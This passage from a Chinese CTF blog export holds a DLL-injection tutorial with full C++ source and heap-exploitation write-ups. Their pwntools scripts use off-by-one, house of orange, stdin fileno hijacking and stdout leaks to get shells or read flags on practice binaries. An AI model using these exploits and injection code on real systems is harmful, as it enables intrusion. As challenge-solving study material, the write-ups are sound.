DLL_PROCESS_ATTACH:          MessageBox(NULL,&quot;注入成功！&quot;,&quot;&quot;,MB_OK);          break;      case DLL_THREAD_ATTACH:      case DLL_THREAD_DETACH:      case DLL_PROCESS_DETACH:          break;      &#125;      return TRUE;  &#125;  \n\nDllMain就犹如Main函数作用一样，DllMain函数会在当程序加载完这个Dll时执行。这样，我们就可以在里面写代码\n编译后，我们来测试一下。\n\n\ndouby.exe 是我们的目标程序，DllInject.dll是编译后的dll文件，keygen.exe是注入程序\n首先，我们运行douby.exe\n然后，我们运行keygen.exe将DllInject.dll注入到douby.exe的进程中去\n\n\n这个弹窗来自我们在dll里写的那个MessageBox，这说明我们的dll被成功加载到douby.exe这个程序中去了。\n既然测试成功，那么接下来，我们就可以为所欲为了，\n如何在dll中访问宿主的内存呢?\n我们可以用强制转换，把地址值转换成指针\n比如，我们想访问0x401260处的内容，我们可以\nDWORD *p = (DWORD *)0x401260;  printf(&quot;%d\\n&quot;,*p);  \n\n本题，我们可以直接在dll中利用win api 完成所有功能，不用这么麻烦，\n难点在于，如何取得控件窗口的句柄，以及如何接管菜单的事件?\n首先是控件句柄的获取\nFindWindow函数可以根据窗口名称获取窗口的句柄\nEnumChildWindows函数可以枚举窗口中的控件，我们再判断控件的id来确定是不是我们要找的\n我们主要是要获取编辑框的句柄，这样我们才能操作编辑器(设置文本，获取文本)\n文本框的id是怎么找到的呢?\n用ollydbg打开程序，\n\n\n选择”所有模块间的调用”，找CreateWindiows相关的名称，一个个点进去看看\n\n\n我们发现了，这个控件带有EDIT字样，就是一个文本框，hMenu&#x3D;00000001，这个值就是控件的ID ，不明白为什么的可以看看CreateWindow相关函数的定义。\n//获得编辑框  editor = FindDlgItem(0x1,mainWnd); \n\n于是上述我们就是这样获取编辑框的句柄\n我们用SetWindowText函数给它设置测试文本，发现文本成功设置上去，说明这个就是那个编辑框的句柄了\n现在，我们要做的就是如何响应Menu事件呢?\nSetWindowLongPtr函数可以将窗口的WinProc消息接管到自己的函数里，于是\noriWndProc &#x3D; SetWindowLongPtr(mainWnd, GWLP_WNDPROC, (LONG_PTR)WndProc);  \n这个函数的第一个参数是窗口句柄，我们传入的是主窗口句柄\nWndProc是我们自己定义的函数,用来处理事件\n//事件处理  LRESULT __stdcall WndProc(HWND hWnd, UINT uMsg, WPARAM wParam, LPARAM lParam)  &#123;      switch (uMsg) &#123;      case WM_COMMAND:          switch (wParam) &#123;          //几个菜单事件          case 40001: //Load              loadFile();              return 0;          case 40005: //Save              saveFile();              return 0;          case 40003: //Exit              exitApp();              return 0;          &#125;          break;      &#125;      return CallWindowProcW((WNDPROC)oriWndProc, hWnd, uMsg, wParam, lParam);  &#125;  \n\n现在问题又来了，上述的几个值它们分别代表三个选项的ID，它们是怎么来的？\n在汇编里应该可以算出来，但感觉有点麻烦，于是我就把wParam所有值都记录下来，点击相应的选项一次，再看看值。最终得到了它们的ID\n好了，上述工作都做完了，我们来看看DllInject.cpp的完整代码\n#define _CRT_SECURE_NO_WARNINGS    #include &lt;iostream&gt;  #include &lt;windows.h&gt;    using std::cout;  using std::endl;    //文本框控件  HWND editor;    //退出程序  void exitApp() &#123;      ExitProcess(0);  &#125;    //加载文件  void loadFile() &#123;      OPENFILENAME ofn;      CHAR szFile[100];      LPCSTR INIT_PATH = &quot;.txt&quot;;      ZeroMemory(&amp;ofn, sizeof(ofn));      ofn.lStructSize = sizeof(ofn);      ofn.hwndOwner = NULL;      ofn.lpstrFile = szFile;      ofn.lpstrFile[0] = &#x27;\\0&#x27;;      ofn.nMaxFile = sizeof(szFile);      ofn.lpstrFilter = INIT_PATH;      ofn.nFilterIndex = 1;      ofn.lpstrFileTitle = NULL;      ofn.nMaxFileTitle = 0;      ofn.lpstrInitialDir = NULL;      ofn.Flags = OFN_PATHMUSTEXIST | OFN_FILEMUSTEXIST;      if (GetOpenFileName(&amp;ofn)) &#123;          HANDLE hFile = CreateFile(ofn.lpstrFile,              GENERIC_READ,              0,              NULL,              OPEN_EXISTING,              FILE_ATTRIBUTE_NORMAL,              0          );          if (hFile == INVALID_HANDLE_VALUE)          &#123;              MessageBox(NULL, &quot;创建文件句柄出错&quot;, &quot;error&quot;, MB_OK);              return;          &#125;          DWORD size = GetFileSize(hFile,NULL);          if (size == -1) &#123;              MessageBox(NULL, &quot;获取文件大小出错&quot;, &quot;error&quot;, MB_OK);              return;          &#125;          CHAR* data = new CHAR[size];          int filesucc = ReadFile(hFile,              data,              size,//读取文件中多少内容              NULL,              NULL          );          SetWindowText(editor,data);          delete[] data;          CloseHandle(hFile);      &#125;  &#125;    //保存文件  void saveFile() &#123;      OPENFILENAME ofn;      CHAR szFile[100];      LPCSTR TYPE = &quot;.txt&quot;;      ZeroMemory(&amp;ofn, sizeof(ofn));      ofn.lStructSize = sizeof(ofn);      ofn.hwndOwner = NULL;      ofn.lpstrFile = szFile;      ofn.lpstrFile[0] = &#x27;\\0&#x27;;      ofn.nMaxFile = sizeof(szFile);      ofn.lpstrFilter = NULL;      ofn.nFilterIndex = 1;      ofn.lpstrFileTitle = NULL;      ofn.nMaxFileTitle = 0;      ofn.lpstrInitialDir = NULL;      ofn.Flags = OFN_PATHMUSTEXIST | OFN_FILEMUSTEXIST;      if (GetSaveFileName(&amp;ofn)) &#123;          HANDLE hFile = CreateFile(ofn.lpstrFile,              GENERIC_WRITE,              0,              NULL,              CREATE_NEW,              FILE_ATTRIBUTE_NORMAL,              0          );          if (hFile == INVALID_HANDLE_VALUE)          &#123;              MessageBox(NULL, &quot;创建文件句柄出错&quot;, &quot;error&quot;, MB_OK);              return;          &#125;          int size = GetWindowTextLengthA(editor);          CHAR* buf = new CHAR[size];          GetWindowText(editor,buf,size);          DWORD dwWritenSize = 0;          BOOL bRet = WriteFile(hFile,buf,size, &amp;dwWritenSize, NULL);          CloseHandle(hFile);          delete[] buf;          MessageBox(NULL, &quot;文件保存成功!&quot;, &quot;ojbk&quot;, MB_OK);      &#125;  &#125;    struct StructFindTaskManagerDlgItem  &#123;      DWORD  itemID;//控件ID      HWND   hwnd;//该控件的句柄  &#125;;    //枚举子控件  BOOL CALLBACK _EnumChildProc(HWND hwnd, LPARAM lParam)  &#123;      StructFindTaskManagerDlgItem* pParam = (StructFindTaskManagerDlgItem*)lParam;        if ((DWORD)GetDlgCtrlID(hwnd) == pParam-&gt;itemID)//判断是否为需要的控件      &#123;          pParam-&gt;hwnd = hwnd;            return FALSE;      &#125;        return TRUE;  &#125;    //根据控件ID获取控件控件句柄  HWND FindDlgItem(DWORD CtrlId,HWND &amp; mainWnd)  &#123;      StructFindTaskManagerDlgItem param;        param.itemID = CtrlId;      param.hwnd = NULL;        //根据窗口名字，即可获取到它的句柄      //获取主窗口句柄      mainWnd = FindWindow(0x0,&quot;ReverseMe1 - Official practice of the Reverse EngineerZINE&quot;);      if (mainWnd == NULL)      &#123;          MessageBox(NULL, &quot;请先运行douby.exe程序！&quot;, &quot;&quot;, MB_OK);          return NULL;      &#125;      //枚举子窗口，      EnumChildWindows(mainWnd, _EnumChildProc, (LPARAM)&amp; param);      return param.hwnd;  &#125;    LONG_PTR oriWndProc;    //事件处理  LRESULT __stdcall WndProc(HWND hWnd, UINT uMsg, WPARAM wParam, LPARAM lParam)  &#123;      switch (uMsg) &#123;      case WM_COMMAND:          switch (wParam) &#123;          //几个菜单事件          case 40001: //Load              loadFile();              return 0;          case 40005: //Save              saveFile();              return 0;          case 40003: //Exit              exitApp();              return 0;          &#125;          break;      &#125;      return CallWindowProcW((WNDPROC)oriWndProc, hWnd, uMsg, wParam, lParam);  &#125;    HWND mainWnd;    void Start()  &#123;      //为窗口设置新的事件处理      oriWndProc = SetWindowLongPtr(mainWnd, GWLP_WNDPROC, (LONG_PTR)WndProc);  &#125;    //初始化一些事  void initSome() &#123;      //获得编辑框      editor = FindDlgItem(0x1,mainWnd);      //创建线程，用于接管窗口事件      CreateThread(NULL, NULL, reinterpret_cast&lt;LPTHREAD_START_ROUTINE&gt;(Start), NULL, NULL, NULL); // start another thread running the hooking stuff  &#125;    BOOL APIENTRY DllMain(HMODULE hModule,      DWORD  ul_reason_for_call,      LPVOID lpReserved  )  &#123;      switch (ul_reason_for_call)      &#123;      case DLL_PROCESS_ATTACH:          initSome();          MessageBox(NULL,&quot;注入成功！&quot;,&quot;&quot;,MB_OK);          break;      case DLL_THREAD_ATTACH:      case DLL_THREAD_DETACH:      case DLL_PROCESS_DETACH:          break;      &#125;      return TRUE;  &#125;  \n","categories":["CTF"],"tags":["逆向","dll注入"]},{"title":"cscctf_2019_final_childrenheap","url":"/2020/04/17/cscctf_2019_final_childrenheap/","content":"首先，检查一下程序的保护机制\n\n\n然后用IDA分析一下\nUpdate功能存在一个null off by one\n\n\n禁用了fastbin，因此不能fastbin attack。那么可以利用house of orange或者large bin attack，个人认为house of orange较为简单一些。\n\n\n利用null off by one，伪造chunk的prev_size和size，unsorted bin合并形成overlap chunk，从而控制住夹在中间的unsorted bin，然后就是常规的house of orange利用了，由于比较难泄露堆地址，我们就利用house of orange in 2.24的手法，让vtable为_IO_str_jumps_+xxx。\n#coding:utf8from pwn import *#sh = process(&#x27;./cscctf_2019_final_childrenheap&#x27;)sh = remote(&#x27;node3.buuoj.cn&#x27;,29184)libc = ELF(&#x27;/lib/x86_64-linux-gnu/libc-2.23.so&#x27;)malloc_hook_s = libc.symbols[&#x27;__malloc_hook&#x27;]_IO_list_all_s = libc.symbols[&#x27;_IO_list_all&#x27;]system_s = libc.sym[&#x27;system&#x27;]binsh_s = libc.search(&#x27;/bin/sh&#x27;).next()def get_IO_str_jumps():   IO_file_jumps_offset = libc.sym[&#x27;_IO_file_jumps&#x27;]   IO_str_underflow_offset = libc.sym[&#x27;_IO_str_underflow&#x27;]   for ref_offset in libc.search(p64(IO_str_underflow_offset)):       possible_IO_str_jumps_offset = ref_offset - 0x20       if possible_IO_str_jumps_offset &gt; IO_file_jumps_offset:          print possible_IO_str_jumps_offset          return possible_IO_str_jumps_offsetdef add(index,size,content):   sh.sendlineafter(&#x27;&gt;&gt;&#x27;,&#x27;1&#x27;)   sh.sendlineafter(&#x27;Index:&#x27;,str(index))   sh.sendlineafter(&#x27;Size:&#x27;,str(size))   sh.sendafter(&#x27;Content:&#x27;,content)def edit(index,content):   sh.sendlineafter(&#x27;&gt;&gt;&#x27;,&#x27;2&#x27;)   sh.sendlineafter(&#x27;Index:&#x27;,str(index))   sh.sendafter(&#x27;Content:&#x27;,content)def show(index):   sh.sendlineafter(&#x27;&gt;&gt;&#x27;,&#x27;3&#x27;)   sh.sendlineafter(&#x27;Index:&#x27;,str(index))def delete(index):   sh.sendlineafter(&#x27;&gt;&gt;&#x27;,&#x27;4&#x27;)   sh.sendlineafter(&#x27;Index:&#x27;,str(index))add(0,0xF0,&#x27;a&#x27;) #0add(1,0xF8,&#x27;b&#x27;) #1add(2,0xF0,&#x27;c&#x27;) #2add(3,0x10,&#x27;d&#x27;) #3delete(0)#null off by oneedit(1,&#x27;d&#x27;*0xF0 + p64(0x100 + 0x100))delete(2)add(0,0xF0,&#x27;a&#x27;)show(1)sh.recvuntil(&#x27;content: &#x27;)main_arena_88 = u64(sh.recv(6).ljust(8,&#x27;\\x00&#x27;))malloc_hook_addr = (main_arena_88 &amp; 0xFFFFFFFFFFFFF000) + (malloc_hook_s &amp; 0xFFF)libc_base = malloc_hook_addr - malloc_hook_ssystem_addr = libc_base + system_sbinsh_addr = libc_base + binsh_s_IO_list_all_addr = libc_base + _IO_list_all_s_IO_str_jumps_addr = libc_base + get_IO_str_jumps()print &#x27;libc_base=&#x27;,hex(libc_base)print &#x27;malloc_hook_addr=&#x27;,hex(malloc_hook_addr)print &#x27;system_addr=&#x27;,hex(system_addr)print &#x27;_IO_list_all_addr=&#x27;,hex(_IO_list_all_addr)delete(0)add(0,0x100,&#x27;a&#x27;)#通过1，可以完全控制unsorted bin，我们可以用house of orangefake_file = p64(0) + p64(0x60)fake_file += p64(0) + p64(_IO_list_all_addr - 0x10) #unsorted bin attack在_IO_list_all_addr写入main_arena地址fake_file += p64(0) + p64(1)fake_file += p64(0) + p64(binsh_addr)fake_file = fake_file.ljust(0xD8,&#x27;\\x00&#x27;)#vtable指针fake_file += p64(_IO_str_jumps_addr - 8)fake_file += p64(0) + p64(system_addr)edit(1,fake_file)#getshellsh.sendlineafter(&#x27;&gt;&gt;&#x27;,&#x27;1&#x27;)sh.sendlineafter(&#x27;Index:&#x27;,&#x27;7&#x27;)sh.sendlineafter(&#x27;Size:&#x27;,str(0x60))sh.interactive()","categories":["CTF"],"tags":["house of orange","off by one"]},{"title":"d3ctf_2019_ezfile(文件流fileno的巧妙利用)","url":"/2020/06/11/d3ctf_2019_ezfile/","content":"首先，检查一下程序的保护机制\n\n\n然后，我们用IDA分析一下，delete功能存在UAF\n\n\n程序里使用的是write输出，因此劫持IO_2_1_stdout泄露不了数据。\n\n\nAdd功能的size固定\n\n\nEncrypt功能存在栈溢出\n\n\n程序一开头有一个这个\n\n\n我们可以利用堆漏洞劫持IO_2_1_stdin，将里面的fileno改为3，然后利用encrypt功能里的栈溢出，采用低字节覆盖法，将返回地址覆盖到此处\n\n\n而rdi指向我们输出的字符串，因此rdi可控\n\n\n这样，通过栈溢出返回到open处，便可以打开我们想要的文件。又由于_IO_2_1_stdin的fileno被劫持为3，那么scanf救会从这个打开的文件里读取数据到name里，然后后面输出。\n#coding:utf8from pwn import *def add(size,content):   sh.sendlineafter(&#x27;&gt;&gt;&#x27;,&#x27;1&#x27;)   sh.sendlineafter(&#x27;size of your note &gt;&gt;&#x27;,str(size))   sh.sendafter(&#x27;input your content &gt;&gt;&#x27;,content)def delete(index):   sh.sendlineafter(&#x27;&gt;&gt;&#x27;,&#x27;2&#x27;)   sh.sendlineafter(&#x27;input the index to delete &gt;&gt;&#x27;,str(index))def encnote(index,size,seed):   sh.sendlineafter(&#x27;&gt;&gt;&#x27;,&#x27;3&#x27;)   sh.sendlineafter(&#x27;input the index to encrypt &gt;&gt;&#x27;,str(index))   sh.sendlineafter(&#x27;input the size of the seed (max 0x50) &gt;&gt;&#x27;,str(size))   sh.sendafter(&#x27;input the crypt seed &gt;&gt;&#x27;,seed)def exploit():   #0~5   for i in range(6):      add(0x10,&#x27;a&#x27;*0x10)   delete(1)   #double free   delete(0)   delete(0)   add(0x1,&#x27;\\x60&#x27;)   add(0x10,&#x27;a&#x27;*0x10)   #修改chunk0的size   add(0x9,p64(0) + p8(0xA1))   #填满tcache bin   for i in range(7):      delete(0)   #得到unsorted bin   delete(0)   #低字节覆盖，有一定几率到_IO_2_1_stdin_的fileno处   add(0x2,&#x27;\\x70\\xFA&#x27;)   #再来一次double free   delete(2)   delete(2)   add(0x1,&#x27;\\x70&#x27;)   add(0x1,&#x27;a&#x27;)   add(0x1,&#x27;a&#x27;)   #申请到stdin的fileno处，改写fileno为3   add(0x1,p8(3))   encnote(0,0x6A,&#x27;/flag&#x27;.ljust(0x68,&#x27;\\x00&#x27;) + p16(0x5147))   sh.recvuntil(&#x27;welcome!&#x27;)   flag = sh.recvuntil(&#x27;\\n&#x27;)   print &#x27;flag=&#x27;,flagwhile True:   try:      global sh      #sh = process(&#x27;./d3ctf_2019_ezfile&#x27;)      sh = remote(&#x27;node3.buuoj.cn&#x27;,29967)      sh.sendlineafter(&#x27;your name:&#x27;,&#x27;haivk&#x27;)      exploit()      sh.interactive()   except:      sh.close()      print &#x27;trying...&#x27;","categories":["CTF"],"tags":["栈溢出","UAF","partial write bypass PIE","IO FILE"]},{"title":"d3ctf new_heap","url":"/2019/11/28/d3ctf_new_heap/","content":"这题是2019 d3ctf赛的一题，当时没做出来，后来看了大佬的exp脚本，慢慢研究，终于明白了原理，现在，我们就来详细的解析一下这题\n首先，我们还是检查一下程序的保护机制,保护全开\n\n\n再看一下给我们的libc.so.6的版本,可见是glibc2.29，那么对于堆的管理，就存在tcache机制\n\n\n程序只有简单的3个功能，没有show，也没有edit，这让我们手无足措\n\n\n然后，我们用IDA分析一下\n程序一开始申请了一个0x1000的堆，然后告诉我们了堆地址的低2字节数据\n\n\n然后释放了这个堆\n接下来，我们在程序中申请堆时，是从0x1000的堆位置开始申请的，因此，我们知道了堆的低2字节\n最多创建18个堆，并且每个堆的大小最多申请0x78（实际大小0x80）\n\n\n程序唯一的漏洞在这，free后没有把指针清零，可以造成double free\n\n\n退出功能，看似没什么奇怪之处\n\n\n分析到这，我们似乎也找不到一点头绪,果真是高质量题目\n首先，我们总结一下\n\n我们创建不了大的堆，因为做了限制\n\n没有show功能，看似也泄露不了什么\n\ntcache bin是将空闲块的**[数据域]{.mark}互相链接组成链表，而fast bin是将空闲块的[头部]{.mark}**链接起来,tcache bin缺少充分检查，很容易利用，只要修改它的fd，即可申请到某处\n\n\n4、只有UAF漏洞可以利用\n即使不需要泄露，我们也需要unsorted bin，因为unsorted bin的fd和bk处有libc中的指针，但是本题大小做了限制，大小范围都落在fastbin的大小里。并且，没有溢出漏洞，不能溢出来修改size。但是，**[unsorted bin是可以通过整理合并fastbin，来生成的。]{.mark}在ptmalloc中，有一个[malloc_consolidate]{.mark}**函数，用于将fastbin整理合并到unsorted bin里。malloc_consolidate的条件如下之一\n\nmalloc large bin\n\ntop chunk不够空间\n\n在free函数在各种合并前后chunk之后的size大于FASTBIN_CONSOLIDATION_THRESHOLD 也就是65536\n\n\n本题，如何来触发malloc_consolidate呢，关键就在于退出功能，看似好像没什么用，但是getchar()是个关键的地方。\n由于，本题的**[输入都是用的read]{.mark}**\n\n\nread函数内部其实是调用sysread,内部不带缓冲区，从打开的设备或文件中读取数据。因此，在未调用功能3之前，_IO_2_1_stdin_结构体的缓冲区未初始化。\n而getchar()、scanf这些，都是带有缓冲区的，它们依靠_IO_2_1_stdin_结构体，而_IO_2_1_stdin_结构体就是FILE结构体，当我们**[第一次]{.mark}调用带有缓冲区的输入函数时，[函数会判断fp-&gt;_IO_buf_base输入缓冲区是否为空，如果为空则调用的_IO_doallocbuf去初始化输入缓冲区。]{.mark}**\n我们先运行程序，然后用pwndbg attach到pid上\n在没有执行getchar()时，我们看到的_IO_2_1_stdin_结构体内容如下\n\n\n然后，我们执行一下getchar()看看\n\n\n发现，getchar()初始化了缓冲区，并且**[大小为0x400，这个大小属于large bin范围]{.mark}**\n因此，[功能3可以触发一次malloc_consolidate]{.mark}\n能触发malloc_consolidate，那么，我们就能将fastbin变成unsorted bin来利用\n本题最多总能创建18个堆，因此，我们每一次创建都要慎重考虑，尽可能不浪费。\nsh.recvuntil(&#x27;0x&#x27;)  #chunk0的地址低2字节  low_2_byte = int(sh.recv(2),16)    #chunk0~chunk4这5个chunk用于放入tcache bin  for i in range(0,5):     create(sh,0x50,&#x27;f&#x27;*0x50)  #我们需要overlap chunk6，因此，我们需要在chunk6中伪造一个chunk  #prev_size = 0,size = 0x61,fd = bk = 0，刚好overlap到chunk6结尾  payload = &#x27;a&#x27;*(0x50-0x20) + p64(0) + p64(0x61) + p64(0)*2  create(sh,0x50,payload) #chunk5  create(sh,0x38,&#x27;b&#x27;*0x38) #chunk6  create(sh,0x50,&#x27;c&#x27;*0x50) #chunk7 不能靠近top块，因此我们用chunk8挡住  create(sh,0x50,&#x27;d&#x27;*0x50) #chunk8  \n\n我们在chunk5伪造chunk，把chunk6给包含进去(overlap),然后把chunk5里面那个伪造的chunk想办法链到fastbin里面，触发malloc_consolidate,让那个假chunk链接到unsorted bin，然后申请合适大小的堆，使得libc中的指针传递到chunk6的fd处\n#chunk0~chunk5放入tcache bin，使得0x60的tcache bin有6个节点  for i in range(0,6):     delete(sh,i)  #chunk6放入0x40的tcache bin  delete(sh,6)  #chunk8 放入0x60的tcache bin  delete(sh,8)  #chunk7放入0x60的fastbin  delete(sh,7)  #从tcache取出头chunk  create(sh,0x50,&#x27;\\n&#x27;)  #9  #chunk7 放入tcache bin  delete(sh,7)  \n\n我们先把0~5放入0x60的tcache bin，把chunk6放入0x40的tcache bin，把8放入0x60的tcache bin，接下来delete(7)时，由于0x60的tcache bin已经达到了7个，所以chunk7放在fastbin，由于fastbin不检查非top的节点double free，于是，我们从tcache里取出一个，再次delete(7)，那么chunk7成为0x60的tcache bin的头结点。chunk8存在的作用就是使得chunk7不是top，然后我们看看bins的布局\n\n\n#由于chunk7同时存在于tcache bin和fastbin，又由于tcache bin各指针指向的是chunk的数据区，所以，我们这次create时，顺便低位覆盖，便可以  #改变chunk7的fd指针，我们要让chunk7的fd指针指向我们在chunk5末尾伪造的那个chunk，由于chunk6被overlap，然后，我们就可以想办法触发malloc_consolidate，生成  #unsorted bin，再通过申请，把libc中的关键指针传递到chunk6的fd域  create(sh,0x50,p16(((low_2_byte + 2) &lt;&lt; 8) + 0x70)) #10也就是chunk7的空间  \n\n经过这个create操作后，fastbin里的指针发生了变化\n\n\n0x60的fastbin里链入了我们伪造的chunk\n接下来，我们触发malloc_consolidate\n#整理fastbin，使得fastbin变成unsorted bin  mallocConsolidate(sh)  \n\n再看看bins的布局\n\n\n我们伪造的chunk里面fd已经有了libc中的指针，接下来，我们通过申请合适大小的chunk，就能把libc中指针传递到chunk6的fd，使得0x40的tcache bin链上libc中的指针。\n#create后，libc中的指针传到了chunk6的fd处  #我们随便先把/bin/sh字符串保存到这里，最后free_hook时使用  create(sh,0x10,&#x27;/bin/sh&#x27;) #11  \n\n现在，再看看bins\n\n\n因为，我们malloc(0x10)，所以，会**[从unsorted bin里切割0x20，所以unsorted bin头变成了]{.mark}**\n[0x555555757490，然后libc中的指针会被传到下一个chunk，也就是0x555555757490 + 0x10 &#x3D; 0x5555557574a0]{.mark}\n接下来，我们据需申请**[大小不在tcache bin里的chunk，来低位覆盖chunk6的fd]{.mark}**，使得chunk6的fd有可能指向_IO_2_1_stdout_结构体\n#低2字节覆盖，使得chunk6的fd有1/16的可能指向_IO_2_1_stdout_结构体-0x10处  create(sh,0x10,p16((_IO_2_1_stdout_s - 0x10) &amp; 0xFFFF)) #12  \n\n我们**[为什么要劫持_IO_2_1_stdout_结构体呢]{.mark}**？因为程序在创建堆后有一个puts调用\n\n\n我们来看看puts的源代码\nint  _IO_puts (const char *str)  &#123;    int result = EOF;    _IO_size_t len = strlen (str);    _IO_acquire_lock (_IO_stdout);    if ((_IO_vtable_offset (_IO_stdout) != 0         || _IO_fwide (_IO_stdout, -1) == -1)        &amp;&amp; _IO_sputn (_IO_stdout, str, len) == len        &amp;&amp; _IO_putc_unlocked (&#x27;\\n&#x27;, _IO_stdout) != EOF)      result = MIN (INT_MAX, len + 1);    _IO_release_lock (_IO_stdout);    return result;  &#125;  \n\n_IO_puts，[其内部调用_IO_sputn,接着执行_IO_new_file_xsputn,最终会执行_IO_overflow]{.mark}\nint  _IO_new_file_overflow (_IO_FILE *f, int ch)  &#123;    if (f-&gt;_flags &amp; _IO_NO_WRITES) /* SET ERROR */      &#123;        f-&gt;_flags |= _IO_ERR_SEEN;        __set_errno (EBADF);        return EOF;      &#125;    /* If currently reading or no buffer allocated. */    if ((f-&gt;_flags &amp; _IO_CURRENTLY_PUTTING) == 0 || f-&gt;_IO_write_base == NULL)      ......      ......      &#125;    if (ch == EOF)      //我们需要控制_IO_write_base      return _IO_do_write (f, f-&gt;_IO_write_base,               f-&gt;_IO_write_ptr - f-&gt;_IO_write_base);    if (f-&gt;_IO_write_ptr == f-&gt;_IO_buf_end) //当两个地址相等就不会输出缓冲区里数据。      if (_IO_do_flush (f) == EOF)        return EOF;    *f-&gt;_IO_write_ptr++ = ch;    if ((f-&gt;_flags &amp; _IO_UNBUFFERED)        || ((f-&gt;_flags &amp; _IO_LINE_BUF) &amp;&amp; ch == &#x27;\\n&#x27;))      if (_IO_do_write (f, f-&gt;_IO_write_base,                f-&gt;_IO_write_ptr - f-&gt;_IO_write_base) == EOF)        return EOF;    return (unsigned char) ch;  &#125;  \n\n通过上面源码分析，当IO_write_ptr与_IO_buf_end不想等的时候就会打印它们之间的字符，而这之间，可以泄露出一些信息，然后我们就能计算出libc基地址，因此，[我们想办法劫持_IO_2_1_stdout_结构体，将_IO_write_base的低字节覆盖，然后我们调用puts(“done”)时，就能泄露出信息]{.mark}\n当然，由于PIE，我们有**[1&#x2F;16(倒数第4个16进制数可能不一样)]{.mark}**的几率通过低覆盖chunk6的fd，使得fd指向了_IO_2_1_stdout_结构体，我们接下来的操作，都是假设fd正确的指向了_IO_2_1_stdout_结构体\n\n\n当前，覆盖fd，没有指向**IO_2_1_stdout**结构体，当我们假设指向了_IO_2_1_stdout_结构体，那么malloc(0x38)两次就能申请到_IO_2_1_stdout_结构体-0x10处\ncreate(sh,0x38,&#x27;\\n&#x27;) #13  #假设chunk6的fd已经指向了_IO_2_1_stdout_，我们低位覆盖write_base指针  payload = &#x27;\\x00&#x27; * 0x10 + p64(0xfbad1800) + p64(0) * 3 + p8(0)  create(sh,0x38,payload) #14  response = sh.recvuntil(&#x27;done&#x27;)  #没有成功覆盖，说明我们没有命中_IO_2_1_stdout_结构体，抛出异常，重试  if len(response) &lt; 8:     raise Exception(&#x27;retry&#x27;)  #print response  #低位覆盖后，对应地址处的数据向后偏移8，正好是_IO_stdfile_2_lock的地址  _IO_stdfile_2_lock_addr = u64(response[8:16])  #计算出libc的地址  libc_base = _IO_stdfile_2_lock_addr - _IO_stdfile_2_lock  system_addr = libc_base + system_s  free_hook_addr = libc_base + free_s_hook  print &#x27;libc_base=&#x27;,hex(libc_base)  print &#x27;system_addr=&#x27;,hex(system_addr)  print &#x27;free_hook_addr=&#x27;,hex(free_hook_addr)  \n\n如上，我们**[p8(0)将write_base的低1字节覆盖为了0，经过IDA调试，发现低位覆盖后，对应地址处的数据向后偏移8，正好是_IO_stdfile_2_lock的地址]{.mark}**，那么我们就能计算出libc的地址，以及其他一些需要用的函数的地址\n接下来，bins变成这样了\n\n\n现在，我们只剩下3个chunk可以申请，因此再申请就超过了18个了，然而，我们还需要攻击free_hook，当前unsorted bin的头为0x563a0b8d84b0，我们还是想用同样的方法，来修改tcache bin里头结点的fd，但是0x60 tcache bin头结点是0x563a0b8d8440，比unsorted bin的头结点地址低，覆盖不到。但是，[还记得chunk6后面的那个chunk7吗，它的地址正好只比当前unsorted bin的头节点地址高一点,但是chunk7当前不在tcache中，因为之前被申请出去了，那么我们再重新把chunk7放回来]{.mark}\n#让chunk8重新回到tcache中，作为头0x80 tcache bin的头  delete(sh,10)  \n\n然后，我们再看看bins(注意，我们每次调试都重新运行了重新，所以地址会有所变化，但是他们相对地址是不变的)\n\n\n现在，我们可以申请合适大小的chunk，来修改0x60 tcache bin头结点的fd指针，让它指向free_hook\n#接下来，我们再申请，又从unsorted bin里切割一块，但是切得的这一块与chunk7有重合的部分，因此我们可以修改chunk7的fd，让它指向free_hook  payload = &#x27;\\x00&#x27; * 0x20 + p64(free_hook_addr)  create(sh,0x30,payload) #15  \n\n我们再看看bins\n\n\n那么，我们接下来继续申请，正好把free_hook指向system，然后18个堆正好用完\ncreate(sh,0x50,&#x27;e&#x27;*0x50) #16  #将free_hook指向system  create(sh,0x50,p64(system_addr)) #17  #getshell  delete(sh,11)  \n\n\n由于只有1&#x2F;16的几率，我们还需要爆破，综上，我们的exp脚本\n#coding:utf8  from pwn import *    libc = ELF(&#x27;./libc.so.6&#x27;)  free_s_hook = libc.symbols[&#x27;__free_hook&#x27;]  _IO_2_1_stdout_s = libc.symbols[&#x27;_IO_2_1_stdout_&#x27;]  _IO_stdfile_2_lock = libc.symbols[&#x27;_IO_stdfile_2_lock&#x27;]  system_s = libc.sym[&#x27;system&#x27;]    def create(sh,size,content):     sh.sendlineafter(&#x27;3.exit&#x27;,&#x27;1&#x27;)     sh.sendlineafter(&#x27;size:&#x27;,str(size))     sh.sendafter(&#x27;content:&#x27;,content)    def delete(sh,index):     sh.sendlineafter(&#x27;3.exit&#x27;,&#x27;2&#x27;)     sh.sendlineafter(&#x27;index:&#x27;,str(index))    #getchar()会申请large bin触发malloc consolidate  def mallocConsolidate(sh):     sh.sendlineafter(&#x27;3.exit\\n&#x27;,&#x27;3&#x27;)     sh.sendafter(&#x27;sure?\\n&#x27;,&#x27;n&#x27;)    #爆破,成功率1/16  def crack(sh):     sh.recvuntil(&#x27;0x&#x27;)     #chunk0的地址低2字节     low_2_byte = int(sh.recv(2),16)       #chunk0~chunk4这5个chunk用于放入tcache bin     for i in range(0,5):        create(sh,0x50,&#x27;f&#x27;*0x50)     #我们需要overlap chunk6，因此，我们需要在chunk6中伪造一个chunk     #prev_size = 0,size = 0x61,fd = bk = 0，刚好overlap到chunk6结尾     payload = &#x27;a&#x27;*(0x50-0x20) + p64(0) + p64(0x61) + p64(0)*2     create(sh,0x50,payload) #chunk5     create(sh,0x38,&#x27;b&#x27;*0x38) #chunk6     create(sh,0x50,&#x27;c&#x27;*0x50) #chunk7 不能靠近top块，因此我们用chunk8挡住     create(sh,0x50,&#x27;d&#x27;*0x50) #chunk8       #chunk0~chunk5放入tcache bin，使得0x60的tcache bin有6个节点     for i in range(0,6):        delete(sh,i)     #chunk6放入0x40的tcache bin     delete(sh,6)     #chunk8 放入0x60的tcache bin     delete(sh,8)     #chunk7放入0x60的fastbin     delete(sh,7)     #从tcache取出头chunk     create(sh,0x50,&#x27;\\n&#x27;)  #9     #chunk7 放入tcache bin     delete(sh,7)     #由于chunk7同时存在于tcache bin和fastbin，又由于tcache bin各指针指向的是chunk的数据区，所以，我们这次create时，顺便低位覆盖，便可以     #改变chunk7的fd指针，我们要让chunk7的fd指针指向我们在chunk5末尾伪造的那个chunk，由于chunk6被overlap，然后，我们就可以想办法触发malloc_consolidate，生成     #unsorted bin，再通过申请，把libc中的关键指针传递到chunk6的fd域     create(sh,0x50,p16(((low_2_byte + 2) &lt;&lt; 8) + 0x70)) 